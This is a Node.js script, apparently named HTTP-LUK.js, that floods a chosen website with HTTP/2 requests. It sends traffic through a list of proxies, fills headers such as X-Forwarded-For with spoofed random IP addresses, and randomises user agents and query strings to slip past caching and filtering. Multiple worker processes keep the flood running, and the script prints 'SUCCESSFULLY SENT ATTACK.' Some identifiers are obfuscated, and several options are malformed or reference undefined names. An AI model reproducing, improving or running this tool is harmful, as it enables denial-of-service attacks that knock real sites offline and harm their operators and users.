const net = require("net");

 const http2 = require("http2");

 const tls = require("tls");

 const cluster = require("cluster");

 const url = require("url");

 const crypto = require("crypto");

 const UserAgent = require('user-agents');

 const fs = require("fs");

 

 process.setMaxListeners(0);

 require("events").EventEmitter.defaultMaxListeners = 0;

 process.on('uncaughtException', function (exception) {

  });



 if (process.argv.length < 7){console.log(`Usage: node HTTP-LUK.js target time rate thread proxyfile`); process.exit();}

 const headers = {};

  function readLines(filePath) {

     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);

 }

 

 function randomIntn(min, max) {

     return Math.floor(Math.random() * (max - min) + min);

 }

  

 function randstr(_0xcdc8x17) {

   var _0xcdc8x18 = "";

   var _0xcdc8x19 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

   var _0xcdc8x1a = _0xcdc8x19.length;

   for (var _0xcdc8x1b = 0; _0xcdc8x1b < _0xcdc8x17; _0xcdc8x1b++) {

     _0xcdc8x18 += _0xcdc8x19.charAt(Math.floor(Math.random() * _0xcdc8x1a));

   }

   ;

   return _0xcdc8x18;

 }



 function randomElement(elements) {

     return elements[randomIntn(0, elements.length)];

 } 

 

 const args = {

     target: process.argv[2],

     time: ~~process.argv[3],

     Rate: ~~process.argv[4],

     threads: ~~process.argv[5],

     proxyFile: process.argv[6]

 }

 const cplist = [

     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",

     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",

     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"

 ];

 const pathts = ["?s=", "/?", "", "?q=", "?true=", "?"];

 const querys = ["", "&", "", "&&", "and", "=", "+", "?"];

 refers = ["https://www.google.com", "https://check-host.net", "https://www.facebook.com", "https://google.com", "https://youtube.com", "https://facebook.com"];

 var Ref = refers[Math.floor(Math.random() * refers.length)];

 const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"]; 

 const lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"]; 

 const encoding_header = ["deflate, gzip, br", "gzip", "deflate", "br"];

 const control_header = ["no-cache", "max-age=0"];

 const ip_spoof = () => {

   const _0xcdc8x15 = () => {

     return Math.floor(Math.random() * 255);

   };

   return `${""}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${"."}${_0xcdc8x15()}${""}`;

 };

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];

 var proxies = readLines(args.proxyFile);

 const spoofed = ip_spoof();

 var _0xcdc8x28 = querys[Math.floor(Math.random() * querys.length)];

 const parsedTarget = url.parse(args.target);



 if (cluster.isMaster) {

    for (let counter = 1; counter <= args.threads; counter++) {

        cluster.fork();

    }

} else {setInterval(runFlooder) }

 

 class NetSocket {

     constructor(){}

 

  HTTP(options, callback) {

     const parsedAddr = options.address.split(":");

     const addrHost = parsedAddr[0];

     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";

     const buffer = new Buffer.from(payload);

 

     const connection = net.connect({

         host: options.host,

         port: options.port

     });

 

     connection.setTimeout(options.timeout * 10000);

     connection.setKeepAlive(true, 100000);

 

     connection.on("connect", () => {

         connection.write(buffer);

     });

 

     connection.on("data", chunk => {

         const response = chunk.toString("utf-8");

         const isAlive = response.includes("HTTP/1.1 200");

         if (isAlive === false) {

             connection.destroy();

             return callback(undefined, "error: invalid response from proxy server");

         }

         return callback(connection, undefined);

     });

 

     connection.on("timeout", () => {

         connection.destroy();

         return callback(undefined, "error: timeout exceeded");

     });

 

     connection.on("error", error => {

         connection.destroy();

         return callback(undefined, "error: " + error);

     });

 }

 }



 const Socker = new NetSocket();

 headers[":method"] = "GET";

 headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + randstr(15) + _0xcdc8x28 + randstr(15);

 headers["origin"] = parsedTarget.host;

 headers[":scheme"] = "https";

 headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];

 headers["accept-language"] = lang_header[Math.floor(Math.random() * lang_header.length)];

 headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];

 headers["cache-control"] = control_header[Math.floor(Math.random() * control_header.length)];

 headers["x-frame-options"] = "DENY";

 headers["x-content-type-options"] = "nosniff";

 headers["pragma"] = "client-x-cache-on, client-x-cache-remote-on, client-x-check-cacheable, client-x-get-cache-key, client-x-get-extracted-values, client-x-get-ssl-client-session-id, client-x-get-true-cache-key, client-x-serial-no, client-x-get-request-id,client-x-get-nonces,client-x-get-client-ip,client-x-feo-trace";

 headers["upgrade-insecure-requests"] = "1"; 

 headers["X-Forwarded-Proto"] = "HTTP";

 headers["Via"] = spoofed;

 headers["X-Forwarded-For"] = spoofed;

 headers["X-Forwarded-Host"] = spoofed;

 headers["Client-IP"] = spoofed;

 headers["Real-IP"] = spoofed;

 headers["Referer"] = Ref;

 

 function runFlooder() {

     const proxyAddr = randomElement(proxies);

     const parsedProxy = proxyAddr.split(":");

     const userAgentv2 = new UserAgent();

     var useragent = userAgentv2.toString();

     headers[":authority"] = parsedTarget.host

     headers["user-agent"] = useragent;

 

     const proxyOptions = {

         host: parsedProxy[0],

         port: ~~parsedProxy[1],

         address: parsedTarget.host + ":443",

         timeout: 15

     };



     Socker.HTTP(proxyOptions, (connection, error) => {

         if (error) return

 

         connection.setKeepAlive(true, 100000);



         const tlsOptions = {

            ALPNProtocols: ['h2'],

            challengesToSolve: Infinity,

            resolveWithFullResponse: true,

            followAllRedirects: true,

            clientTimeout: 5000,

            clientlareMaxTimeout: 10000,

            maxRedirects: 3,

            ciphers: tls.getCiphers().join(":") + cipper,

            secureProtocol: "TLS_method",

            servername: url.hostname,

            socket: connection,

            honorCipherOrder: true,

            sigals: "rsa_pss_rsae_sha256",

            echdCurve: "GREASE:X25519:x25519",

            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,

            secure: true,

            Compression: false,

            rejectUnauthorized: false,

            port: 80,

            uri: parsedTarget.host,

            servername: parsedTarget.host,

        };



         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 



         tlsConn.setKeepAlive(true, 10 * 10000);

 

         const client = http2.connect(parsedTarget.href, {

             protocol: "https:",

             settings: {

            headerTableSize: 65536,

            maxConcurrentStreams: 1000,

            initialWindowSize: 6291456,

            maxHeaderListSize: 262144,

            enablePush: false

          },

             maxSessionMemory: 3333,

             maxDeflateDynamicTableSize: 4294967295,

             createConnection: () => tlsConn,

             socket: connection,

         });

 

         client.settings({

            headerTableSize: 65536,

            maxConcurrentStreams: 1000,

            initialWindowSize: 6291456,

            maxHeaderListSize: 262144,

            enablePush: false

          });

 

         client.on("connect", () => {

            const IntervalAttack = setInterval(() => {

                for (let i = 0; i < args.Rate; i++) {

                    const request = client.request(headers)

                    

                    .on("response", response => {

                        request.close();

                        request.destroy();

                        return

                    });

    

                    request.end();

                }

            }, 1000); 

         });

 

client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 console.log(gradient.vice(`[!] SUCCESSFULLY SENT ATTACK.`));
 const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);